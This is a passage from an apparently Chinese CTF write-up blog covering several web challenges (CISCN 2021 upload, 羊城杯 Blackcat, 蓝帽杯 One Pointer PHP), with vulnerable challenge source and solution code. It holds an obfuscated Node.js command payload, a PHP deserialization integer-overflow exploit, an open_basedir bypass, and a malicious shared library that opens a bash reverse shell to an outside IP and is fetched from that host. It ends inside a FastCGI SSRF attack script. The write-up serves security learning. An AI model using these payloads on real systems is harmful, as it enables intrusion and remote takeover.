operator">=></span>        <span class="token punctuation">(</span>Math<span class="token operator">=</span><span class="token class-name">Math</span><span class="token punctuation">.</span>constructor<span class="token punctuation">,</span><span class="token comment">//此处类型为ƒ String() &#123; [native code] &#125;</span>                Math<span class="token punctuation">.</span>x<span class="token operator">=</span><span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span>  <span class="token comment">//此处类型为ƒ Function() &#123; [native code] &#125;，生成一个匿名函数</span>                    Math<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span>                        <span class="token number">99</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">77</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span>                        <span class="token number">46</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">113</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>                        <span class="token number">95</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span>                        <span class="token number">121</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>Math<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同时使用了箭头函数和自调用函数，+1将Math转换为String类型传入，而后通过Function构造出一个函数并进行自调用来将返回值传入Math.x，最终的返回值也就是Math.x的值</p>        <h2 id="CISCN2021-Quals-upload"   >          <a href="#CISCN2021-Quals-upload" class="heading-link"><i class="fas fa-link"></i></a><a href="#CISCN2021-Quals-upload" class="headerlink" title="[CISCN2021 Quals]upload"></a>[CISCN2021 Quals]upload</h2>      <p>俩文件，一个upload，一个example</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//upload<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token operator">==</span><span class="token string double-quoted-string">"upload"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'postedFile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">1024</span><span class="token operator">*</span><span class="token number">512</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"这么大个的东西你是想d我吗？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$imageinfo</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'postedFile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$imageinfo</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"如果不能好好传图片的话就还是不要来打扰我了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$imageinfo</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$imageinfo</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"东西不能方方正正的话就很讨厌"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$fileName</span><span class="token operator">=</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'postedFile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"c"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"i"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"h"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ph"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"有些东西让你传上去的话那可不得了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$imagePath</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"image/"</span> <span class="token operator">.</span> <span class="token function">mb_strtolower</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"postedFile"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$imagePath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"upload success, image at <span class="token interpolation"><span class="token variable">$imagePath</span></span>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"传都没有传上去"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">//example<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token operator">==</span><span class="token string double-quoted-string">"poc"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$zip</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$name_for_zip</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"example/"</span> <span class="token operator">.</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token string double-quoted-string">"zip"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"要不咱们再看看？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$zip</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"都不能解压呢"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"可以解压，我想想存哪里"</span><span class="token punctuation">;</span>    <span class="token variable">$pos_for_zip</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/example/"</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$zip</span><span class="token operator">-></span><span class="token function">extractTo</span><span class="token punctuation">(</span><span class="token variable">$pos_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$zip</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">glob</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$pos_for_zip</span></span>/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$first</span> <span class="token operator">=</span> <span class="token function">imagecreatefrompng</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span><span class="token function">imagesx</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">imagesy</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$second</span> <span class="token operator">=</span> <span class="token function">imagecrop</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span> <span class="token operator">=></span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'y'</span> <span class="token operator">=></span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'width'</span> <span class="token operator">=></span> <span class="token variable">$size</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'height'</span> <span class="token operator">=></span> <span class="token variable">$size</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$second</span> <span class="token operator">!==</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$final_name</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"basename"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$second</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'example/'</span><span class="token operator">.</span><span class="token variable">$final_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">imagedestroy</span><span class="token punctuation">(</span><span class="token variable">$second</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">imagedestroy</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h2 id="羊城杯-2020-Blackcat"   >          <a href="#羊城杯-2020-Blackcat" class="heading-link"><i class="fas fa-link"></i></a><a href="#羊城杯-2020-Blackcat" class="headerlink" title="[羊城杯 2020]Blackcat"></a>[羊城杯 2020]Blackcat</h2>      <p>音频最后有源码</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpinclude &quot;initialized.php&quot;;putenv(&quot;clandestine&#x3D;&quot;.randomkeys());if(empty($_POST[&#39;Black-Cat-Sheriff&#39;]) || empty($_POST[&#39;One-ear&#39;]))&#123;    die(&#39;谁！竟敢踩我一只耳的尾巴！&#39;);&#125;$clandestine &#x3D; getenv(&quot;clandestine&quot;);if(isset($_POST[&#39;White-cat-monitor&#39;]))    $clandestine &#x3D; hash_hmac(&#39;sha256&#39;, $_POST[&#39;White-cat-monitor&#39;], $clandestine);$hh &#x3D; hash_hmac(&#39;sha256&#39;, $_POST[&#39;One-ear&#39;], $clandestine);if($hh !&#x3D;&#x3D; $_POST[&#39;Black-Cat-Sheriff&#39;])&#123;    die(&#39;有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。&#39;);&#125;echo exec(&quot;nc&quot;.$_POST[&#39;One-ear&#39;]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>hash_hmac函数如果传入的参数为数字会返回false，那么就可以控制$clandestine为false，进而控制哈希值让命令执行</p>        <h2 id="蓝帽杯-2021-One-Pointer-PHP"   >          <a href="#蓝帽杯-2021-One-Pointer-PHP" class="heading-link"><i class="fas fa-link"></i></a><a href="#蓝帽杯-2021-One-Pointer-PHP" class="headerlink" title="[蓝帽杯 2021]One Pointer PHP"></a>[蓝帽杯 2021]One Pointer PHP</h2>      <p>给了源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"user.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token property">count</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token property">count</span><span class="token operator">+=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"backdoor"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token property">count</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>PHP整数溢出</p><blockquote><p>如果给定的一个整数超出了整型（integer）的范围，将会被解释为浮点型（float）。同样如果执行的运算结果超出了整型（integer）范围，也会返回浮点型（float）。</p></blockquote><p>构造一个conut超出int就能让判断为false，执行命令</p><pre class="line-numbers language-none"><code class="language-none">O:4:&quot;User&quot;:1:&#123;s:5:&quot;count&quot;;i:9223372036854775806;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看phpinfo，ban大量命令，并且设置了open_basedir，那么先绕过这个吧</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"s"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没权限读啊，试试读一下cmdline，和nginx配置文件</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">php-fpm: pool www<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>是phpfpm，可以利用SSRF，读取phpfpm的配置文件</p><pre class="line-numbers language-none"><code class="language-none">listen &#x3D; 127.0.0.1:9001<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在9001端口，下一步就是SSRF了</p><blockquote>        <h3 id="SSRF攻击FPM"   >          <a href="#SSRF攻击FPM" class="heading-link"><i class="fas fa-link"></i></a><a href="#SSRF攻击FPM" class="headerlink" title="SSRF攻击FPM"></a>SSRF攻击FPM</h3>      <p>我们可以通过SSRF来攻击FPM，但是受限于这道题的disable_functions，我们无法直接SSRF，但是可以利用<code>file_put_contents()</code>的一个特性来实现SSRF：</p><p><code>file_put_contents</code>在使用 ftp 协议时, 会将 data 的内容上传到 ftp 服务器, 由于上面说的<code>pasv</code>模式下, 服务器的地址和端口是可控, 我们可以将地址和端口指到<code>127.0.0.1:9000</code>.同时由于 ftp 的特性,不会有任何的多余内容, 类似<code>gopher</code>协议, 会将<code>data</code>原封不动的发给<code>127.0.0.1:9000</code>, 完美符合攻击fastcgi(FPM)的要求.</p></blockquote><p>首先编写一个恶意so文件</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;__attribute__ ((__constructor__)) void preload (void)&#123;    system(&quot;bash -c &#39;exec bash -i &amp;&gt;&#x2F;dev&#x2F;tcp&#x2F;45.15.131.101&#x2F;6666 &lt;&amp;1&#39;&quot;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后让靶机下载<code>var_dump(copy(&#39;http://45.15.131.101:5111/1.so&#39;,&#39;/var/www/html/1.so&#39;));</code></p><p>下一步就是出发SSRF攻击FPM挂载so文件来RCE，下面是脚本</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/** * Note : Code is released under the GNU LGPL * * Please do not change the header of this file * * This library is free software; you can redistribute it and/or modify it under the terms of the GNU * Lesser General Public License as published by the Free Software Foundation; either version 2 of * the License, or (at your option) any later version. * * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. * * See the GNU Lesser General Public License for more details. */</span><span class="token comment">/** * Handles communication with a FastCGI application * * @author      Pierrick Charron &lt;pierrick@webstart.fr> * @version     1.0 */</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FCGIClient</span><span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token constant">VERSION_1</span>            <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">BEGIN_REQUEST</span>        <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">ABORT_REQUEST</span>        <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">END_REQUEST</span>          <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">PARAMS</span>               <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">STDIN</span>                <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">STDOUT</span>               <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">STDERR</span>               <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">DATA</span>                 <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span 